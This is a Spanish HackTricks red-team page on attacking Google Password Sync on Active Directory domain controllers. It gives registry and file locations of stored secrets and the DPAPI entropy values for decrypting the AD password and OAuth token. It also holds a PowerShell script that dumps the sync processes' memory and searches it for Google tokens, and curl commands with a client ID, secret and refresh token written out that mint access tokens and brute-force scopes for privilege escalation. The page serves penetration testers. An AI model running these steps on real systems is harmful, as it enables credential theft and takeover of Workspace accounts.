# GPS - Google Password Sync

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Informaci칩n B치sica

Este es el binario y servicio que Google ofrece para **mantener sincronizadas las contrase침as de los usuarios entre el AD** y Workspace. Cada vez que un usuario cambia su contrase침a en el AD, se establece en Google.

Se instala en `C:\Program Files\Google\Password Sync` donde puedes encontrar el binario `PasswordSync.exe` para configurarlo y `password_sync_service.exe` (el servicio que seguir치 ejecut치ndose).

### GPS - Configuraci칩n

Para configurar este binario (y servicio), es necesario **darle acceso a un principal de Super Admin en Workspace**:

* Iniciar sesi칩n a trav칠s de **OAuth** con Google y luego **almacenar치 un token en el registro (encriptado)**
* Solo disponible en Controladores de Dominio con GUI
* Proporcionar algunas **credenciales de Cuenta de Servicio de GCP** (archivo json) con permisos para **gestionar los usuarios de Workspace**
* Muy mala idea ya que esas credenciales nunca expiran y podr칤an ser mal utilizadas
* Muy mala idea dar acceso a una SA sobre workspace ya que la SA podr칤a ser comprometida en GCP y ser칤a posible pivotar a Workspace
* Google lo requiere para controladores de dominio sin GUI
* Estas credenciales tambi칠n se almacenan en el registro

En cuanto al AD, es posible indicarle que use el **contexto de aplicaciones actual, an칩nimo o algunas credenciales espec칤ficas**. Si se selecciona la opci칩n de credenciales, el **nombre de usuario** se almacena dentro de un archivo en el **disco** y la **contrase침a** est치 **encriptada** y almacenada en el **registro**.

### GPS - Extracci칩n de contrase침a y token del disco

{% hint style="success" %}
Ten en cuenta que [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) es capaz de detectar **GPS**, obtener informaci칩n sobre la configuraci칩n y **incluso desencriptar la contrase침a y el token**.
{% endhint %}

En el archivo **`C:\ProgramData\Google\Google Apps Password Sync\config.xml`** es posible encontrar parte de la configuraci칩n como el **`baseDN`** del AD configurado y el **`nombre de usuario`** cuyas credenciales se est치n utilizando.

En el registro **`HKLM\Software\Google\Google Apps Password Sync`** es posible encontrar el **token de actualizaci칩n encriptado** y la **contrase침a encriptada** para el usuario de AD (si la hay). Adem치s, si en lugar de un token, se utilizan algunas **credenciales de SA**, tambi칠n es posible encontrar esas encriptadas en esa direcci칩n del registro. Los **valores** dentro de este registro son solo **accesibles** por **Administradores**.

La **contrase침a encriptada** (si la hay) est치 dentro de la clave **`ADPassword`** y est치 encriptada usando la API **`CryptProtectData`**. Para desencriptarla, necesitas ser el mismo usuario que configur칩 la sincronizaci칩n de contrase침as y usar esta **entrop칤a** al usar **`CryptUnprotectData`**: `byte[] entropyBytes = new byte[] { 0xda, 0xfc, 0xb2, 0x8d, 0xa0, 0xd5, 0xa8, 0x7c, 0x88, 0x8b, 0x29, 0x51, 0x34, 0xcb, 0xae, 0xe9 };`

El token encriptado (si lo hay) est치 dentro de la clave **`AuthToken`** y est치 encriptado usando la API **`CryptProtectData`**. Para desencriptarlo, necesitas ser el mismo usuario que configur칩 la sincronizaci칩n de contrase침as y usar esta **entrop칤a** al usar **`CryptUnprotectData`**: `byte[] entropyBytes = new byte[] { 0x00, 0x14, 0x0b, 0x7e, 0x8b, 0x18, 0x8f, 0x7e, 0xc5, 0xf2, 0x2d, 0x6e, 0xdb, 0x95, 0xb8, 0x5b };`\
Adem치s, tambi칠n est치 codificado usando base32hex con el diccionario **`0123456789abcdefghijklmnopqrstv`**.

Los valores de entrop칤a se encontraron utilizando la herramienta. Se configur칩 para monitorear las llamadas a **`CryptUnprotectData`** y **`CryptProtectData`** y luego se utiliz칩 la herramienta para lanzar y monitorear `PasswordSync.exe`, que desencriptar치 la contrase침a y el token de autenticaci칩n configurados al principio y la herramienta **mostrar치 los valores de la entrop칤a utilizada** en ambos casos:

<figure><img src="../../../.gitbook/assets/telegram-cloud-photo-size-4-5782633230648853886-y.jpg" alt=""><figcaption></figcaption></figure>

Ten en cuenta que tambi칠n es posible ver los valores **desencriptados** en la entrada o salida de las llamadas a estas APIs tambi칠n (en caso de que en alg칰n momento Winpeas deje de funcionar).

En caso de que la sincronizaci칩n de contrase침as se haya **configurado con credenciales de SA**, tambi칠n se almacenar치 en claves dentro del registro **`HKLM\Software\Google\Google Apps Password Sync`**.

### GPS - Extracci칩n de tokens de la memoria

Al igual que con GCPW, es posible volcar la memoria del proceso de `PasswordSync.exe` y los procesos de `password_sync_service.exe` y podr치s encontrar tokens de actualizaci칩n y acceso (si ya han sido generados).\
Supongo que tambi칠n podr칤as encontrar las credenciales configuradas del AD.

<details>

<summary>Dump <code>PasswordSync.exe</code> y los procesos <code>password_sync_service.exe</code> y buscar tokens</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Show EULA if it wasn't accepted yet for strings
$stringsPath

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$processNames = @("PasswordSync", "password_sync_service")
$chromeProcesses = Get-Process | Where-Object { $processNames -contains $_.Name } | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}
```
</details>

### GPS - Generando tokens de acceso a partir de tokens de actualizaci칩n

Usando el token de actualizaci칩n, es posible generar tokens de acceso utilizando este y el ID de cliente y el secreto de cliente especificados en el siguiente comando:
```bash
curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
https://www.googleapis.com/oauth2/v4/token
```
### GPS - Scopes

{% hint style="info" %}
Tenga en cuenta que incluso teniendo un token de actualizaci칩n, no es posible solicitar ning칰n alcance para el token de acceso, ya que solo puede solicitar los **alcances admitidos por la aplicaci칩n donde est치 generando el token de acceso**.

Adem치s, el token de actualizaci칩n no es v치lido en todas las aplicaciones.
{% endhint %}

Por defecto, GPS no tendr치 acceso como el usuario a todos los posibles alcances de OAuth, por lo que utilizando el siguiente script podemos encontrar los alcances que se pueden usar con el `refresh_token` para generar un `access_token`:

<details>

<summary>Script Bash para fuerza bruta de alcances</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

Y este es el resultado que obtuve en el momento de la escritura:
```
https://www.googleapis.com/auth/admin.directory.user
```
Que es el mismo que obtienes si no indicas ning칰n alcance.

{% hint style="danger" %}
Con este alcance podr칤as **modificar la contrase침a de un usuario existente para escalar privilegios**.
{% endhint %}

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
